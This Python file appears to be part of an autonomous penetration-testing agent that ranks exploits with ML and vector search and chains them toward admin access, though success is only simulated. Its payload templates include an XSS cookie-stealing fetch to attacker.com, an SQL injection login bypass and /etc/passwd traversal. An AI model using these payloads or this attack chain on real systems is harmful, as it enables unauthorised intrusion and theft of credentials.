"""
PHASE 3: The Agent Integration (The "Hands")
Decision-making module for autonomous exploit selection.

This is where "Red Teaming" becomes "Autonomous":
1. Recon Loop - Scans target, queries vector store
2. Strategy Selector - Uses ML to rank exploits
3. Auto-Coder - Adapts exploits to target
"""

import os
import re
import json
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import numpy as np

# Import our ML components
from exploit_ml_models import (
    ExploitabilityClassifier, 
    SuccessProbabilityRanker,
    ExploitMLPipeline,
    ExploitCandidate
)
from exploit_vector_store import ExploitVectorStore, ExploitEntry

# Try to import NVD lookup
try:
    import nvdlib
    NVD_AVAILABLE = True
except ImportError:
    NVD_AVAILABLE = False


@dataclass
class TargetContext:
    """Context about the current target"""
    ip: str
    port: int
    service: str
    banner: str
    platform: str
    os_version: Optional[str] = None
    access_level: str = "none"  # none, public, internal, admin
    constraints: Optional[List[str]] = None  # e.g., ["no_dos", "stealth"]


@dataclass
class ExploitDecision:
    """Result of the decision-making process"""
    exploit_id: int
    exploit_name: str
    exploit_type: str
    success_probability: float
    cvss_score: float
    cve_id: Optional[str]
    rationale: str
    alternative_exploits: List[Dict]
    constraints_satisfied: bool
    adapted_payload: Optional[str] = None


class AgentConstraints:
    """
    Defines constraints for the autonomous agent.
    Prevents certain attack types based on engagement rules.
    """
    
    DEFAULT_CONSTRAINTS = {
        "no_dos": True,          # Don't cause denial of service
        "stealth": False,        # Avoid detection
        "no_destructive": True,  # Don't destroy data
        "prefer_rce": True,      # Prefer remote code execution
        "max_cvss": 10.0,        # Maximum severity to attempt
        "min_cvss": 3.0,         # Minimum severity worth trying
    }
    
    def __init__(self, custom_constraints: Dict = None):
        self.constraints = self.DEFAULT_CONSTRAINTS.copy()
        if custom_constraints:
            self.constraints.update(custom_constraints)
    
    def is_allowed(self, exploit_entry: ExploitEntry) -> Tuple[bool, str]:
        """
        Check if an exploit is allowed under current constraints.
        
        Returns:
            (is_allowed, reason)
        """
        # Check DOS constraint
        if self.constraints.get("no_dos") and exploit_entry.exploit_type == "dos":
            return False, "DOS attacks are forbidden"
        
        # Check CVSS bounds
        if exploit_entry.cvss_score > self.constraints.get("max_cvss", 10.0):
            return False, f"CVSS {exploit_entry.cvss_score} exceeds max allowed"
        
        if exploit_entry.cvss_score < self.constraints.get("min_cvss", 0.0):
            return False, f"CVSS {exploit_entry.cvss_score} below minimum threshold"
        
        # Check destructive constraint
        destructive_keywords = ['delete', 'destroy', 'wipe', 'format', 'drop table']
        if self.constraints.get("no_destructive"):
            desc_lower = exploit_entry.description.lower()
            for keyword in destructive_keywords:
                if keyword in desc_lower:
                    return False, f"Potentially destructive exploit (contains '{keyword}')"
        
        return True, "All constraints satisfied"


class NVDEnricher:
    """Enriches exploit data with NVD information."""
    
    def __init__(self):
        self.cache: Dict[str, Dict] = {}
    
    def lookup(self, cve_id: str) -> Optional[Dict]:
        """Lookup CVE in NVD database."""
        if not cve_id:
            return None
        
        if cve_id in self.cache:
            return self.cache[cve_id]
        
        if not NVD_AVAILABLE:
            # Return mock data
            return {
                "cve": cve_id,
                "cvss_v3": 7.5,
                "vector": "NETWORK",
                "cwe": "CWE-79",
                "description": f"Vulnerability {cve_id}"
            }
        
        try:
            import time
            time.sleep(0.7)  # Rate limiting
            
            results = nvdlib.searchCVE(cveId=cve_id)
            if not results:
                return None
            
            r = results[0]
            data = {
                "cve": cve_id,
                "cvss_v3": r.v31score if hasattr(r, 'v31score') else 5.0,
                "vector": r.v31vector if hasattr(r, 'v31vector') else "UNKNOWN",
                "cwe": r.cwe[0].cweId if hasattr(r, 'cwe') and r.cwe else "UNKNOWN",
                "description": r.descriptions[0].value if r.descriptions else ""
            }
            
            self.cache[cve_id] = data
            return data
            
        except Exception as e:
            print(f"[!] NVD lookup failed for {cve_id}: {e}")
            return None


class DecisionMaker:
    """
    The brain of the autonomous agent.
    Combines vector search, ML models, and constraints to select exploits.
    """
    
    def __init__(self, 
                 models_dir: str = "models",
                 vector_store_path: str = None,
                 constraints: Dict = None):
        """
        Initialize the decision maker.
        
        Args:
            models_dir: Directory containing trained models
            vector_store_path: Path to saved vector store
            constraints: Custom agent constraints
        """
        self.models_dir = models_dir
        os.makedirs(models_dir, exist_ok=True)
        
        # Initialize components
        self.ml_pipeline = ExploitMLPipeline(models_dir)
        self.vector_store = ExploitVectorStore()
        self.constraints = AgentConstraints(constraints)
        self.nvd_enricher = NVDEnricher()
        
        # Load vector store if provided
        if vector_store_path and os.path.exists(vector_store_path):
            self.vector_store.load(vector_store_path)
    
    def analyze_target(self, context: TargetContext) -> ExploitDecision:
        """
        Main decision-making function.
        Analyzes target and selects best exploit.
        
        Args:
            context: Target context (IP, port, banner, etc.)
            
        Returns:
            ExploitDecision with recommended exploit and rationale
        """
        print(f"\n[*] Analyzing target: {context.ip}:{context.port}")
        print(f"    Service: {context.service}")
        print(f"    Banner: {context.banner[:50]}..." if len(context.banner) > 50 else f"    Banner: {context.banner}")
        
        # Step 1: Vector Search for matching exploits
        search_query = f"{context.service} {context.banner} {context.platform}"
        potential_exploits = self.vector_store.search(
            search_query,
            top_k=20,
            filter_platform=context.platform if context.platform != "unknown" else None
        )
        
        if not potential_exploits:
            print("[!] No matching exploits found in vector store")
            return self._no_exploit_decision()
        
        print(f"[+] Found {len(potential_exploits)} potential exploits")
        
        # Step 2: Filter by constraints
        allowed_exploits = []
        for entry, similarity in potential_exploits:
            is_allowed, reason = self.constraints.is_allowed(entry)
            if is_allowed:
                allowed_exploits.append((entry, similarity))
            else:
                print(f"    [-] Filtered out: {entry.description[:40]}... ({reason})")
        
        if not allowed_exploits:
            print("[!] All exploits filtered by constraints")
            return self._no_exploit_decision(reason="All candidates violate constraints")
        
        print(f"[+] {len(allowed_exploits)} exploits pass constraints")
        
        # Step 3: Enrich with NVD data
        candidates = []
        for entry, similarity in allowed_exploits[:10]:  # Top 10
            # Get NVD data if available
            nvd_data = None
            if entry.cve_ids:
                nvd_data = self.nvd_enricher.lookup(entry.cve_ids[0])
            
            cvss_score = entry.cvss_score
            if nvd_data and nvd_data.get('cvss_v3'):
                cvss_score = nvd_data['cvss_v3']
            
            candidate = ExploitCandidate(
                id=entry.id,
                name=entry.description[:100],
                exploit_type=entry.exploit_type,
                cvss_score=cvss_score,
                days_since_disclosure=entry.days_since_disclosure,
                is_verified=entry.is_verified,
                code_complexity=len(entry.description) // 10,
                platform=entry.platform
            )
            candidates.append(candidate)
        
        # Step 4: Rank by ML model
        ranked_candidates = self.ml_pipeline.ranker.rank_candidates(candidates)
        
        print("\n[*] Top 3 candidates:")
        for i, candidate in enumerate(ranked_candidates[:3]):
            print(f"    {i+1}. [{candidate.probability:.2f}] {candidate.name[:60]}...")
        
        # Step 5: Select best exploit
        best = ranked_candidates[0]
        best_entry = self.vector_store.get_exploit_by_id(best.id)
        
        # Build rationale
        rationale = self._build_rationale(best, best_entry, context)
        
        # Build alternatives list
        alternatives = [
            {
                "id": c.id,
                "name": c.name,
                "probability": c.probability,
                "cvss": c.cvss_score
            }
            for c in ranked_candidates[1:4]
        ]
        
        return ExploitDecision(
            exploit_id=best.id,
            exploit_name=best.name,
            exploit_type=best.exploit_type,
            success_probability=best.probability,
            cvss_score=best.cvss_score,
            cve_id=best_entry.cve_ids[0] if best_entry.cve_ids else None,
            rationale=rationale,
            alternative_exploits=alternatives,
            constraints_satisfied=True
        )
    
    def _build_rationale(self, candidate: ExploitCandidate, 
                         entry: ExploitEntry, 
                         context: TargetContext) -> str:
        """Build human-readable rationale for the decision."""
        reasons = []
        
        # CVSS reasoning
        if candidate.cvss_score >= 9.0:
            reasons.append(f"Critical severity (CVSS {candidate.cvss_score})")
        elif candidate.cvss_score >= 7.0:
            reasons.append(f"High severity (CVSS {candidate.cvss_score})")
        
        # Verification reasoning
        if candidate.is_verified:
            reasons.append("Verified exploit with CVE")
        
        # Age reasoning
        if candidate.days_since_disclosure < 90:
            reasons.append("Recent disclosure, likely unpatched")
        elif candidate.days_since_disclosure > 365:
            reasons.append("Older exploit, but still potentially viable")
        
        # Type reasoning
        type_reasons = {
            "remote": "Remote exploitation possible without authentication",
            "webapps": "Web application attack suitable for HTTP target",
            "local": "Local privilege escalation (requires initial access)",
            "dos": "Denial of service attack"
        }
        if candidate.exploit_type in type_reasons:
            reasons.append(type_reasons[candidate.exploit_type])
        
        # Success probability
        reasons.append(f"ML model predicts {candidate.probability:.0%} success rate")
        
        return " | ".join(reasons)
    
    def _no_exploit_decision(self, reason: str = "No matching exploits found") -> ExploitDecision:
        """Return a null decision when no exploit is available."""
        return ExploitDecision(
            exploit_id=-1,
            exploit_name="No exploit selected",
            exploit_type="none",
            success_probability=0.0,
            cvss_score=0.0,
            cve_id=None,
            rationale=reason,
            alternative_exploits=[],
            constraints_satisfied=True
        )
    
    def get_exploit_for_access_level(self, 
                                     context: TargetContext,
                                     target_access: str) -> ExploitDecision:
        """
        Get exploit suitable for reaching a target access level.
        
        Args:
            context: Current target context
            target_access: Desired access level (public, internal, admin)
            
        Returns:
            ExploitDecision for appropriate exploit
        """
        # Determine appropriate exploit type based on current and target access
        current = context.access_level
        
        if current == "none" and target_access in ["public", "internal", "admin"]:
            # Need remote exploit for initial access
            filter_type = "remote"
        elif current == "public" and target_access in ["internal", "admin"]:
            # Need web app or auth bypass
            filter_type = "webapps"
        elif current == "internal" and target_access == "admin":
            # Need privilege escalation
            filter_type = "local"
        else:
            filter_type = None
        
        # Modify context for filtered search
        modified_context = TargetContext(
            ip=context.ip,
            port=context.port,
            service=context.service,
            banner=f"{context.banner} {filter_type or ''}",
            platform=context.platform,
            os_version=context.os_version,
            access_level=context.access_level,
            constraints=context.constraints
        )
        
        decision = self.analyze_target(modified_context)
        decision.rationale += f" | Target: {current} → {target_access}"
        
        return decision
    
    def adapt_exploit(self, exploit_id: int, target_ip: str, 
                      target_port: int) -> Optional[str]:
        """
        Adapt exploit for specific target.
        This is a simplified version - full implementation would
        parse and modify exploit code.
        
        Args:
            exploit_id: ID of exploit to adapt
            target_ip: Target IP address
            target_port: Target port
            
        Returns:
            Adapted exploit command/payload or None
        """
        entry = self.vector_store.get_exploit_by_id(exploit_id)
        if not entry:
            return None
        
        # Generate placeholder command
        # In production, this would parse actual exploit files
        payload_templates = {
            "sqli": f"sqlmap -u 'http://{target_ip}:{target_port}/vulnerable?id=1' --dbs",
            "xss": f"<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
            "rce": f"curl -X POST http://{target_ip}:{target_port}/api/exec -d 'cmd=id'",
            "lfi": f"http://{target_ip}:{target_port}/page?file=../../../etc/passwd",
            "auth_bypass": f"curl -X POST http://{target_ip}:{target_port}/login -d \"user=' OR 1=1--&pass=x\"",
        }
        
        payload_type = entry.payload_type
        if payload_type in payload_templates:
            return payload_templates[payload_type]
        
        return f"# Exploit {exploit_id} for {target_ip}:{target_port}\n# Manual adaptation required"


class AutonomousAgent:
    """
    High-level autonomous agent that uses DecisionMaker
    to automatically select and sequence exploits.
    """
    
    def __init__(self, decision_maker: DecisionMaker):
        self.decision_maker = decision_maker
        self.history: List[Dict] = []
        self.current_access = "none"
    
    def run_attack_cycle(self, target: TargetContext) -> List[ExploitDecision]:
        """
        Run a full attack cycle, attempting to escalate access.
        
        Returns:
            List of decisions made during the cycle
        """
        decisions = []
        access_chain = ["none", "public", "internal", "admin"]
        
        current_idx = access_chain.index(self.current_access)
        
        for target_access in access_chain[current_idx + 1:]:
            print(f"\n{'='*60}")
            print(f"Attempting: {self.current_access} → {target_access}")
            print('='*60)
            
            target.access_level = self.current_access
            decision = self.decision_maker.get_exploit_for_access_level(
                target, target_access
            )
            
            decisions.append(decision)
            
            if decision.success_probability > 0.5:
                # Simulate success
                self.current_access = target_access
                print(f"[+] Access escalated to: {target_access}")
            else:
                print(f"[-] Failed to escalate (probability: {decision.success_probability:.2f})")
                break
            
            if self.current_access == "admin":
                print("\n[!] ADMIN ACCESS ACHIEVED")
                break
        
        return decisions


if __name__ == "__main__":
    print("Testing Decision Maker...")
    
    # Create decision maker
    dm = DecisionMaker(
        models_dir="models",
        constraints={"no_dos": True, "stealth": True}
    )
    
    # Create sample context
    context = TargetContext(
        ip="192.168.1.100",
        port=80,
        service="Apache",
        banner="Apache/2.4.49 (Unix) OpenSSL/1.1.1",
        platform="linux",
        access_level="none"
    )
    
    # Add sample data to vector store (in production, load from file)
    import pandas as pd
    sample_data = pd.DataFrame({
        'id': [1, 2, 3],
        'description': [
            'Apache HTTP Server 2.4.49 Path Traversal CVE-2021-41773',
            'Apache Struts OGNL Injection RCE CVE-2017-5638',
            'Apache Tomcat AJP File Read CVE-2020-1938'
        ],
        'exploit_type': ['remote', 'webapps', 'remote'],
        'platform': ['linux', 'multiple', 'multiple'],
        'cvss_score': [9.8, 10.0, 9.8],
        'cve_ids': ['CVE-2021-41773', 'CVE-2017-5638', 'CVE-2020-1938'],
        'payload_type': ['rce', 'rce', 'lfi'],
        'days_since_disclosure': [800, 2500, 1400],
        'is_verified': [True, True, True]
    })
    
    dm.vector_store.add_exploits(sample_data)
    
    # Make decision
    print("\n" + "="*60)
    print("MAKING EXPLOIT DECISION")
    print("="*60)
    
    decision = dm.analyze_target(context)
    
    print("\n" + "="*60)
    print("DECISION RESULT")
    print("="*60)
    print(f"Selected: {decision.exploit_name}")
    print(f"Type: {decision.exploit_type}")
    print(f"Success Probability: {decision.success_probability:.2%}")
    print(f"CVSS: {decision.cvss_score}")
    print(f"CVE: {decision.cve_id}")
    print(f"Rationale: {decision.rationale}")
    
    if decision.alternative_exploits:
        print("\nAlternatives:")
        for alt in decision.alternative_exploits:
            print(f"  - [{alt['probability']:.2f}] {alt['name'][:50]}...")
